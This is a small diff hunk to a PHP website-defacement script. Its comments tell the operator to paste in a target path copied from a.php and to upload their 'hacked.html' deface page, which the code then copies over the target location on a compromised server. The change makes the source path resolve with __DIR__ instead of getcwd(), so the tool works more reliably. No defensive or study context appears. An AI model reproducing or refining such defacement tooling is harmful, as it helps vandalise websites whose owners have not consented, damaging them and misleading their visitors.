@@ -7,7 +7,7 @@
     you are executing these files!
   */
   $targetDir = "paste copied data here from a.php" . "/hacked.html"; // change hacked.html to your deface page name
-  $fromDir = getcwd() . "/hacked.html"; // change hacked.html to your deface page name
+  $fromDir = __DIR__ . "/hacked.html"; // change hacked.html to your deface page name
   //I assume hacked.html is your deface page that you have to upload in the same directory where these files are in!
   copy($fromDir, $targetDir);
   if (file_exists($targetDir))
